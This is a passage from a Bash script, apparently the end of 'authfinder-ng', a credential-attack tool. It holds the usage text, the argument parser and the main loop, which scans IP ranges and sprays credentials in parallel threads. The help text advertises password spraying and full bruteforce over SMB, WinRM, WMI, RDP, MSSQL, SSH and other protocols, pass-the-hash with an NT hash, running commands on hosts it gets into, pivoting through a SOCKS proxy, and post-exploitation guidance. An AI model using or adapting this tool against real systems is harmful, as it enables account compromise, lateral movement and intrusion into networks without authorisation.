usage() {
    cat << EOF
${BOLD}${LC}authfinder-ng${NC} v${VERSION} — Multi-Protocol Credential Testing Engine

${BOLD}USAGE:${NC}
  authfinder-ng <target> [auth] [options]

${BOLD}TARGETS:${NC}
  10.10.10.1            Single IP
  10.10.10.1-50         Dash range
  192.168.1.0/24        CIDR
  targets.txt           File of IPs/ranges

${BOLD}AUTH OPTIONS:${NC}
  -u  USER              Single username
  -i  FILE              Username file (one per line)
  -p  PASS              Single password
  -P  FILE              Password file (one per line) — creates cartesian spray
  -H  HASH              NT hash (pass-the-hash)
  -f  FILE              Combined cred file (user:pass per line)
  -d  DOMAIN            Domain name (auto-detected from SMB if omitted)
  --local-auth          Force local auth (no domain)

${BOLD}SCAN OPTIONS:${NC}
  --skip-scan           Skip discovery — attempt all protocols on default ports
  --rescan              Force fresh scan (ignore cache)
  --add-to-hosts        Auto-add hostname to /etc/hosts

${BOLD}EXECUTION:${NC}
  -c  CMD               Command to run (default: whoami /all)
  --tools LIST          Comma-sep: smb,winrm,wmi,rdp,mssql,ssh,ftp,ldap,http
  --run-all             Continue after first success on a host
  --linux               Linux mode (SSH-focused, uses id/uname)
  --no-next-steps       Hide post-exploitation guidance

${BOLD}SPRAY OPTIONS:${NC}
  --bruteforce          Full user×pass bruteforce (default: safe round-robin spray)
  --delay N             Seconds between attempts (default: 0)
  --lockout-thresh N    Pause after N user failures (default: 3)

${BOLD}MISC:${NC}
  --threads N           Parallel target threads (default: 5)
  --timeout N           Per-command timeout in seconds (default: 22)
  --proxy URL           SOCKS5 proxy: socks5://127.0.0.1:1080
  --report FILE         Save markdown report
  --check-tools         Verify tool availability
  --install-tools       Auto-install all dependencies
  -v                    Verbose/debug output

${BOLD}EXAMPLES:${NC}
  # Single credential
  authfinder-ng 10.10.10.1 -u admin -p 'Password123'

  # Pass-the-hash
  authfinder-ng 10.10.10.1 -u administrator -H aad3b435b51404eeaad3b435b51404ee

  # User spray (same password, many users)
  authfinder-ng 10.10.10.1 -i users.txt -p 'Summer2024!'

  # Full spray (cartesian: every user × every password)
  authfinder-ng 10.10.10.1 -i users.txt -P passwords.txt -d CORP.LOCAL

  # Subnet spray with domain
  authfinder-ng 192.168.1.0/24 -u jsmith -p 'Pass123' -d CORP.LOCAL

  # Combined cred file
  authfinder-ng 10.10.10.1 -f found_creds.txt

  # Linux target (SSH focus)
  authfinder-ng 10.10.10.1 -i users.txt -P pass.txt --linux

  # Specific protocols only
  authfinder-ng 10.10.10.1 -u admin -p pass --tools winrm,mssql

  # Through pivot proxy
  authfinder-ng 192.168.2.0/24 -u admin -p pass --proxy socks5://127.0.0.1:1080

  # Use cached scan with new creds (no re-scan)
  authfinder-ng 10.10.10.1 -u newuser -p newpass     # cache auto-loaded!

  # Force fresh scan
  authfinder-ng 10.10.10.1 -u admin -p pass --rescan

${BOLD}CRED FILE FORMATS:${NC}
  user:password                      # colon-separated
  user password                      # space-separated
  # comments and blank lines ignored

EOF
    exit 0
}

# ═══════════════════════════════════════════════════════════════════════════════
# ARGUMENT PARSER
# ═══════════════════════════════════════════════════════════════════════════════
parse_args() {
    [[ $# -eq 0 ]] && usage

    local i=0
    local -a args=("$@")
    local raw_users="" raw_pass="" raw_passfile="" raw_userfile="" raw_creds_file=""

    while [[ $i -lt ${#args[@]} ]]; do
        local a="${args[$i]}"
        case "$a" in
            -h|--help)           usage ;;
            --install-tools)     ONLY_INSTALL=true ;;
            --check-tools)       ONLY_CHECK=true ;;
            -v|--verbose)        VERBOSE=true ;;
            --run-all)           RUN_ALL=true ;;
            --skip-scan)         SKIP_SCAN=true ;;
            --rescan)            RESCAN=true ;;
            --linux)             LINUX_MODE=true ;;
            --local-auth)        LOCAL_AUTH=true ;;
            --no-next-steps)     SHOW_STEPS=false ;;
            --bruteforce)        SAFE_SPRAY=false ;;
            --add-to-hosts)      ADD_TO_HOSTS=true ;;
            -u|--user)           ((i++)); raw_users="${args[$i]}" ;;
            -i|--users-file)     ((i++)); raw_userfile="${args[$i]}" ;;
            -p|--pass|--password)((i++)); raw_pass="${args[$i]}" ;;
            -P|--pass-file)      ((i++)); raw_passfile="${args[$i]}" ;;
            -H|--hash)           ((i++)); raw_pass="${args[$i]}"; CRED_IS_HASH=1 ;;
            -d|--domain)         ((i++)); DOMAIN="${args[$i]}" ;;
            -c|--command)        ((i++)); EXEC_CMD="${args[$i]}" ;;
            -f|--file)           ((i++)); raw_creds_file="${args[$i]}" ;;
            --tools)             ((i++)); IFS=',' read -ra SELECTED_TOOLS <<< "${args[$i],,}" ;;
            --threads)           ((i++)); THREADS="${args[$i]}" ;;
            --timeout)           ((i++)); TIMEOUT="${args[$i]}" ;;
            --delay)             ((i++)); DELAY="${args[$i]}" ;;
            --lockout-thresh)    ((i++)); LOCKOUT_THRESH="${args[$i]}" ;;
            --report)            ((i++)); REPORT_FILE="${args[$i]}" ;;
            --proxy)             ((i++)); PROXY="${args[$i]}" ;;
            -*)
                echo -e "${LR}[!] Unknown option: ${a}  (use --help)${NC}" >&2; exit 1 ;;
            *)
                [[ -z "$TARGET" ]] && TARGET="$a" || {
                    echo -e "${LR}[!] Unexpected argument: ${a}${NC}" >&2; exit 1; } ;;
        esac
        ((i++)) || true
    done

    # Build USERS array
    if [[ -n "$raw_userfile" ]]; then
        [[ ! -f "$raw_userfile" ]] && { echo -e "${LR}[!] User file not found: ${raw_userfile}${NC}" >&2; exit 1; }
        while IFS= read -r line; do
            line="${line%%$'\r'}"; line="${line// /}"
            [[ -z "$line" || "$line" == "#"* ]] && continue
            USERS+=("$line")
        done < "$raw_userfile"
    elif [[ -n "$raw_users" ]]; then
        USERS+=("$raw_users")
    fi

    # Build PASSES array
    if [[ -n "$raw_passfile" ]]; then
        [[ ! -f "$raw_passfile" ]] && { echo -e "${LR}[!] Password file not found: ${raw_passfile}${NC}" >&2; exit 1; }
        while IFS= read -r line; do
            line="${line%%$'\r'}"
            [[ -z "$line" || "$line" == "#"* ]] && continue
            PASSES+=("$line")
        done < "$raw_passfile"
    elif [[ -n "$raw_pass" ]]; then
        PASSES+=("$raw_pass")
    fi

    # Combined cred file: user:pass or user pass per line
    if [[ -n "$raw_creds_file" ]]; then
        [[ ! -f "$raw_creds_file" ]] && { echo -e "${LR}[!] Cred file not found: ${raw_creds_file}${NC}" >&2; exit 1; }
        while IFS= read -r line; do
            line="${line%%$'\r'}"; line="${line%%#*}"; line="${line#"${line%%[![:space:]]*}"}"
            [[ -z "$line" ]] && continue
            local u="" p=""
            if [[ "$line" == *:* ]]; then
                u="${line%%:*}"; p="${line#*:}"
            elif [[ "$line" == *" "* ]]; then
                u="${line%% *}"; p="${line#* }"
            else
                continue
            fi
            [[ -z "$u" || -z "$p" ]] && continue
            USERS+=("$u"); PASSES+=("$p")
        done < "$raw_creds_file"
        # For combined files, pair up (u[0]:p[0], u[1]:p[1])
        SAFE_SPRAY=false
    fi

    # Linux mode defaults
    $LINUX_MODE && {
        SELECTED_TOOLS=(ssh ftp)
        EXEC_CMD="id && whoami && hostname && uname -a"
    }

    # Proxy setup
    [[ -n "$PROXY" ]] && {
        export PROXYCHAINS_CONF="/tmp/af_proxychains.conf"
        local phost; phost=$(echo "$PROXY" | grep -oP '[\d.]+:\d+$')
        cat > "$PROXYCHAINS_CONF" << PCONF
strict_chain
proxy_dns
[ProxyList]
socks5 ${phost/ /:}
PCONF
        PROXYCHAINS="proxychains4 -f ${PROXYCHAINS_CONF} -q"
        p_info "Proxy configured: ${PROXY}"
    }
}

validate_args() {
    $ONLY_INSTALL && return 0
    $ONLY_CHECK   && return 0

    [[ -z "$TARGET" ]] && { echo -e "${LR}[!] Target required${NC}" >&2; usage; }
    [[ ${#USERS[@]} -eq 0 ]] && { echo -e "${LR}[!] Username required: -u USER or -i FILE${NC}" >&2; exit 1; }
    [[ ${#PASSES[@]} -eq 0 ]] && { echo -e "${LR}[!] Password required: -p PASS, -P FILE, or -H HASH${NC}" >&2; exit 1; }
}

# ═══════════════════════════════════════════════════════════════════════════════
# MAIN
# ═══════════════════════════════════════════════════════════════════════════════
main() {
    parse_args "$@"
    banner

    # Setup
    detect_variants
    check_tools || true

    $ONLY_CHECK   && exit 0
    $ONLY_INSTALL && install_tools

    validate_args

    # Temp workspace
    TMP_DIR=$(mktemp -d)
    HITS_FILE="${TMP_DIR}/hits.txt"
    AUTH_FILE="${TMP_DIR}/auth_only.txt"
    FAIL_FILE="${TMP_DIR}/failures.txt"
    LOCK_FILE="${TMP_DIR}/output.lock"
    CMD_LOG="${TMP_DIR}/commands.log"
    touch "$HITS_FILE" "$AUTH_FILE" "$FAIL_FILE" "$LOCK_FILE" "$CMD_LOG"
    trap cleanup EXIT

    # Copy log to named file if report requested
    [[ -n "$REPORT_FILE" ]] && CMD_LOG="${REPORT_FILE%.md}.commands.log"

    # Parse target IPs
    local -a ips=()
    mapfile -t ips < <(parse_ip_range "$TARGET")
    [[ ${#ips[@]} -eq 0 ]] && { echo -e "${LR}[!] No IPs parsed from: ${TARGET}${NC}"; exit 1; }

    # Summary header
    lprint "${BOLD}${B}── Engagement Parameters ────────────────────────────────────────${NC}"
    lprint "${INFO} Targets  : ${BOLD}${#ips[@]}${NC} host(s)"
    lprint "${INFO} Users    : ${BOLD}${#USERS[@]}${NC} | Passwords: ${BOLD}${#PASSES[@]}${NC}"
    lprint "${INFO} Command  : ${Y}${EXEC_CMD}${NC}"
    [[ -n "$DOMAIN" ]] && lprint "${INFO} Domain   : ${BOLD}${DOMAIN}${NC}"
    $LOCAL_AUTH        && lprint "${INFO} Mode     : ${Y}Local Auth${NC}"
    [[ ${#SELECTED_TOOLS[@]} -gt 0 ]] && lprint "${INFO} Tools    : ${Y}${SELECTED_TOOLS[*]}${NC}"
    $SAFE_SPRAY        && lprint "${INFO} Spray    : ${Y}Safe round-robin (1 pass/user/round)${NC}"
    [[ "$DELAY" -gt 0 ]] && lprint "${INFO} Delay    : ${Y}${DELAY}s between attempts${NC}"
    lprint ""

    # Process each target
    for ip in "${ips[@]}"; do
        (
            LAST_OUT="" LAST_RC=0

            # Discovery (or load cache)
            local -a services=()
            mapfile -t services < <(discover_target "$ip")

            [[ ${#services[@]} -eq 0 ]] && exit 0

            # Null auth check (once per host)
            DISCOVERED_SERVICES="${services[*]}"
            check_null_auth "$ip"

            # Spray
            spray_target "$ip" "${services[@]}"
        ) &

        # Thread throttle
        while [[ $(jobs -r 2>/dev/null | wc -l) -ge "$THREADS" ]]; do sleep 0.2; done
    done

    wait
    print_summary
}

LAST_OUT=""
LAST_RC=0
main "$@"
